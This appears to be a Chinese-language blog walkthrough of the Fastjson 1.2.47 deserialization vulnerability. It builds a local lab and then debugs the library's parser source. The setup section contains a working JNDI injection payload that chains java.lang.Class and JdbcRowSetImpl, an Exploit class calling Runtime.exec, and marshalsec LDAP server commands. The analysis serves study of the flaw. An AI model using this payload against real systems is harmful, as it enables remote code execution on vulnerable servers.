# Fastjson 
                com.alibaba
                fastjson
                1.2.47
新建一个`com.example`的`Package`并在其目录下创建一个`FastjsonExp`的类
    //FastjsonExp.java
    package com.example;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.serializer.SerializerFeature;
    public class FastjsonExp {
        public static void main(String[] args) {
            String payload="{n" +
                    "    "rand1": {n" +
                    "        "@type": "java.lang.Class", n" +
                    "        "val": "com.sun.rowset.JdbcRowSetImpl"n" +
                    "    }, n" +
                    "    "rand2": {n" +
                    "        "@type": "com.sun.rowset.JdbcRowSetImpl", n" +
                    "        "dataSourceName": "ldap://localhost:8088/Exploit", n" +
                    "        "autoCommit": truen" +
                    "    }n" +
                    "}";
            JSON.parse(payload);
        }
    }
在`java`目录新建一个`Exploit.java`,并编译
    //Exploit.java
    import java.io.IOException;
    public class Exploit {
        public Exploit() throws IOException {
            Runtime.getRuntime().exec("galculator");
        }
    }
在编译的`Exploit.class`类下，开启一个HTTP服务`python -m SimpleHTTPServer`  
使用`marshalsec`创建一个ldap接口:  
`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
"http://127.0.0.1:8000/#Exploit" 8088`
至此，环境搭建完毕
## 报错
    Exception in thread "main" com.alibaba.fastjson.JSONException: set property error, autoCommit
        at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:162)
        at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:124)
        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:1078)
        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:773)
        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:1283)
        at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JdbcRowSetImpl.deserialze(Unknown Source)
        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:267)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:384)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:544)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1356)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1322)
        at com.alibaba.fastjson.JSON.parse(JSON.java:152)
        at com.alibaba.fastjson.JSON.parse(JSON.java:162)
        at com.alibaba.fastjson.JSON.parse(JSON.java:131)
        at com.example.FastjsonExp.main(FastjsonExp.java:29)
    Caused by: java.lang.reflect.InvocationTargetException
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:497)
        at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:110)
        ... 14 more
    Caused by: java.sql.SQLException: JdbcRowSet (connect) JNDI unable to connect
        at com.sun.rowset.JdbcRowSetImpl.connect(JdbcRowSetImpl.java:634)
        at com.sun.rowset.JdbcRowSetImpl.setAutoCommit(JdbcRowSetImpl.java:4067)
        ... 19 more
## 调试
在报错的各个文件处，先设断点:
首先进入的是`JSON.java`下的`public static Object parse(String text)`，
此时`DEFAULT_PARSER_FEATURE=989`  
接着是
        //features=989,  ParserConfig.getGlobalInstance()=
        public static Object parse(String text, int features) {
            return parse(text, ParserConfig.getGlobalInstance(), features);
        }
`ParserConfig.getGlobalInstance()`如下:`com.alibaba.fastjson.parser.ParserConfig`
其中`deserializers`变量为`IdentityHashMap`类，有一些可反序列化的类名，还可以看到`autoTypeSupport=false`  
及定义的`denyHashCodes`，即黑名单配置
在`public static Object parse(String text, ParserConfig config, int
features)`函数中
        public static Object parse(String text, ParserConfig config, int features) {
            if (text == null) {
                return null;
            }
            DefaultJSONParser parser = new DefaultJSONParser(text, config, features);
            Object value = parser.parse();
            parser.handleResovleTask(value);
            parser.close();
            return value;
        }
首先声明了一个`DefaultJSONParser`,并调用其`parse`函数，所以主要的工作应该都是在这里完成的.  
初始化类时，先加载了一些基础类：
        static {
            Class[] classes = new Class[] {
                    boolean.class,
                    byte.class,
                    ...
                    String.class
            };
            for (Class clazz : classes) {
                primitiveClasses.add(clazz);
            }
        }
调用`parser.parse()`后, 继续调用了`parse(Object fieldName)`函数
    //DefaultJSONParser.java
        public Object parse(Object fieldName) {
            final JSONLexer lexer = this.lexer;
            switch (lexer.token()) {
                case SET:
                    lexer.nextToken();
                    HashSet set = new HashSet();
                    parseArray(set, fieldName);
                    return set;
                case TREE_SET:
                    lexer.nextToken();
                    TreeSet treeSet = new TreeSet();
                    parseArray(treeSet, fieldName);
                    return treeSet;
                case LBRACKET:
                    JSONArray array = new JSONArray();
                    parseArray(array, fieldName);
                    if (lexer.isEnabled(Feature.UseObjectArray)) {
                        return array.toArray();
                    }
                    return array;
                case LBRACE:
                    JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
                    return parseObject(object, fieldName);
    //            case LBRACE: {
    //                Map map = lexer.isEnabled(Feature.OrderedField)
    //                        ? new LinkedHashMap()
    //                        : new HashMap();
    //                Object obj = parseObject(map, fieldName);
    //                if (obj != map) {
    //                    return obj;
    //                }
    //                return new JSONObject(map);
    //            }
                case LITERAL_INT:
                    Number intValue = lexer.integerValue();
                    lexer.nextToken();
                    return intValue;
                case LITERAL_FLOAT:
                    Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));
                    lexer.nextToken();
                    return value;
                case LITERAL_STRING:
                    String stringLiteral = lexer.stringVal();
                    lexer.nextToken(JSONToken.COMMA);
                    if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) {
                        JSONScanner iso8601Lexer = new JSONScanner(stringLiteral);
                        try {
                            if (iso8601Lexer.scanISO8601DateIfMatch()) {
                                return iso8601Lexer.getCalendar().getTime();
                            }
                        } finally {
                            iso8601Lexer.close();
                        }
                    }
                    return stringLiteral;
                case NULL:
                    lexer.nextToken();
                    return null;
                case UNDEFINED:
                    lexer.nextToken();
                    return null;
                case TRUE:
                    lexer.nextToken();
                    return Boolean.TRUE;
                case FALSE:
                    lexer.nextToken();
                    return Boolean.FALSE;
                case NEW:
                    lexer.nextToken(JSONToken.IDENTIFIER);
                    if (lexer.token() != JSONToken.IDENTIFIER) {
                        throw new JSONException("syntax error");
                    }
                    lexer.nextToken(JSONToken.LPAREN);
                    accept(JSONToken.LPAREN);
                    long time = ((Number) lexer.integerValue()).longValue();
                    accept(JSONToken.LITERAL_INT);
                    accept(JSONToken.RPAREN);
                    return new Date(time);
                case EOF:
                    if (lexer.isBlankInput()) {
                        return null;
                    }
                    throw new JSONException("unterminated json string, " + lexer.info());
                case HEX:
                    byte[] bytes = lexer.bytesValue();
                    lexer.nextToken();
                    return bytes;
                case IDENTIFIER:
                    String identifier = lexer.stringVal();
                    if ("NaN".equals(identifier)) {
                        lexer.nextToken();
                        return null;
                    }
                    throw new JSONException("syntax error, " + lexer.info());
                case ERROR:
                default:
                    throw new JSONException("syntax error, " + lexer.info());